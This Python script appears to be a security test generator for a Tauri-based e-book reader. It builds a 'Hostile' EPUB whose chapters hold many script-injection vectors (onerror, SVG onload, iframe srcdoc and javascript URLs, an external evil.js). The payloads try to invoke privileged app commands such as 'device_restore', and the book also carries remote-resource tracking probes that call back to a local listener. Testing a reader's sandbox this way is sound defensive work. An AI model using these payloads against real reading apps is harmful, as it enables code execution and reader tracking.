import zipfile,sys,html
B='http://127.0.0.1:8931'
def X(n): return f"new Image().src='{B}/exec/{n}';try{{parent.__TAURI_INTERNALS__.invoke('report',{{msg:'EXEC {n}'}});parent.__TAURI_INTERNALS__.invoke('device_restore').then(function(r){{parent.__TAURI_INTERNALS__.invoke('report',{{msg:'RESTORE-OK {n}'}})}},function(e){{parent.__TAURI_INTERNALS__.invoke('report',{{msg:'RESTORE-DENIED {n} '+e}})}})}}catch(e){{}}"
q=lambda s:html.escape(s,quote=True)
SVG='xmlns="http://www.w3.org/2000/svg"'
scripts=f'''<p>scripts section</p>
<script>{X('inline')}</script>
<script type="text/javascript" src="evil.js"></script>
<img src="data:," onerror="{q(X('onerror'))}"/>
<svg {SVG} onload="{q(X('svgonload'))}" width="1" height="1"></svg>
<svg {SVG} width="1" height="1"><script>{X('svgscript')}</script></svg>
<svg {SVG} width="1" height="1"><rect width="1" height="1"><animate attributeName="x" from="0" to="1" dur="0.1s" onbegin="{q(X('svganimate'))}"/></rect></svg>
<iframe srcdoc="{q('<script>'+X('srcdoc').replace('parent.','parent.parent.')+'</script>')}"></iframe>
<iframe src="data:text/html,{q('<script>'+X('dataframe')+'</script>')}"></iframe>
<iframe src="javascript:{q(X('jsframe'))}"></iframe>
<iframe src="inner.xhtml"></iframe>
<object data="inner.xhtml" type="application/xhtml+xml"></object>
<embed src="inner.xhtml" type="text/html"/>
<details open="open" ontoggle="{q(X('ontoggle'))}"><summary>s</summary></details>
<input autofocus="autofocus" onfocus="{q(X('onfocus'))}"/>
<style onload="{q(X('styleonload'))}">p{{}}</style>
<body onload="{q(X('nestedbody'))}"></body>
<video src="x.mp4" onerror="{q(X('videoerror'))}"></video>
'''
remote=f'''<p>remote section</p>
<img data-probe="remote" src="{B}/net/img"/>
<img data-probe="coverhost" src="{B}/cover.png"/>
<img data-probe="asset" src="asset://localhost/%s"/>
<img data-probe="assethttp" src="http://asset.localhost/%s"/>
<img data-probe="local" src="ok.png"/>
<img src="data:," srcset="{B}/net/srcset 1x"/>
<picture><source srcset="{B}/net/picture"/><img src="data:,"/></picture>
<div style="background:url({B}/net/inlinecss)">x</div>
<audio src="{B}/net/audio" autoplay="autoplay"></audio>
<video src="{B}/net/video" poster="{B}/net/poster" autoplay="autoplay"></video>
<svg {SVG} xmlns:xlink="http://www.w3.org/1999/xlink" width="1" height="1"><image href="{B}/net/svgimage" width="1" height="1"/><image xlink:href="{B}/net/svgxlink" width="1" height="1"/></svg>
<object data="{B}/net/object"></object><embed src="{B}/net/embed"/>
<iframe src="{B}/net/iframe"></iframe>
<form action="{B}/net/form" method="get"><input type="hidden" name="a" value="1"/><input type="image" src="{B}/net/inputimage"/></form>
<a id="ext" href="{B}/net/link" target="_blank">out</a>
'''
def doc(body,head=''): return f'''<?xml version="1.0" encoding="utf-8"?>
<html xmlns="http://www.w3.org/1999/xhtml"><head><title>t</title>{head}</head><body>{body}</body></html>'''
asset=sys.argv[2].lstrip('/')
import urllib.parse
enc=urllib.parse.quote('/'+asset,safe='')
head2=f'''<link rel="stylesheet" href="{B}/net/linkcss"/><link rel="stylesheet" href="book.css"/><link rel="preload" as="image" href="{B}/net/preload"/><link rel="prefetch" href="{B}/net/prefetch"/><link rel="dns-prefetch" href="//dnsprefetch.invalid"/><style>@import url({B}/net/importcss); @font-face{{font-family:z;src:url({B}/net/font)}} body{{font-family:z;background:url({B}/net/stylecss)}}</style>'''
head3=f'''<meta http-equiv="refresh" content="0;url={B}/net/refresh"/><base href="{B}/net/base/"/>'''
head4=f'''<meta http-equiv="Content-Security-Policy" content="default-src *; script-src * 'unsafe-inline'"/>'''
files={
 'mimetype':'application/epub+zip',
 'META-INF/container.xml':'<?xml version="1.0"?><container version="1.0" xmlns="urn:oasis:names:tc:opendocument:xmlns:container"><rootfiles><rootfile full-path="OEBPS/c.opf" media-type="application/oebps-package+xml"/></rootfiles></container>',
 'OEBPS/c.opf':'''<?xml version="1.0"?><package xmlns="http://www.idpf.org/2007/opf" version="3.0" unique-identifier="i"><metadata xmlns:dc="http://purl.org/dc/elements/1.1/"><dc:identifier id="i">hostile-1</dc:identifier><dc:title>Hostile</dc:title><dc:language>en</dc:language><meta property="dcterms:modified">2026-01-01T00:00:00Z</meta></metadata><manifest>
<item id="nav" href="nav.xhtml" media-type="application/xhtml+xml" properties="nav"/>
<item id="a" href="a.xhtml" media-type="application/xhtml+xml" properties="scripted svg remote-resources"/>
<item id="b" href="b.xhtml" media-type="application/xhtml+xml" properties="remote-resources"/>
<item id="c" href="c.xhtml" media-type="application/xhtml+xml"/>
<item id="d" href="d.xhtml" media-type="application/xhtml+xml" properties="scripted"/>
<item id="inner" href="inner.xhtml" media-type="application/xhtml+xml"/>
<item id="css" href="book.css" media-type="text/css"/><item id="js" href="evil.js" media-type="text/javascript"/><item id="png" href="ok.png" media-type="image/png"/>
</manifest><spine><itemref idref="a"/><itemref idref="b"/><itemref idref="c"/><itemref idref="d"/></spine></package>''',
 'OEBPS/nav.xhtml':doc('<nav xmlns:epub="http://www.idpf.org/2007/ops" epub:type="toc"><ol><li><a href="a.xhtml">a</a></li><li><a href="b.xhtml">b</a></li><li><a href="c.xhtml">c</a></li><li><a href="d.xhtml">d</a></li></ol></nav>'),
 'OEBPS/a.xhtml':doc(scripts),
 'OEBPS/b.xhtml':doc(remote%(enc,enc),head2),
 'OEBPS/c.xhtml':doc('<p>refresh and base section</p><img src="rel.png"/>',head3),
 'OEBPS/d.xhtml':doc('<p>meta relax section</p><script>'+X('metarelax')+'</script><img src="'+B+'/net/metarelax"/>',head4),
 'OEBPS/inner.xhtml':doc('<script>'+X('innerdoc').replace('parent.','parent.parent.')+'</script>'),
 'OEBPS/evil.js':X('extscript'),
 'OEBPS/book.css':f"@import url({B}/net/bookimport);p{{background:url({B}/net/bookcssbg)}}@font-face{{font-family:y;src:url({B}/net/bookfont)}}",
}
png=bytes.fromhex('89504e470d0a1a0a0000000d4948445200000001000000010806000000 1f15c4890000000d49444154789c6300010000000500010d0a2db40000000049454e44ae426082'.replace(' ',''))
with zipfile.ZipFile(sys.argv[1],'w',zipfile.ZIP_DEFLATED) as z:
    z.writestr(zipfile.ZipInfo('mimetype'),files.pop('mimetype'),zipfile.ZIP_STORED)
    for k,v in files.items(): z.writestr(k,v)
    z.writestr('OEBPS/ok.png',png)
open(sys.argv[2],'wb').write(png)
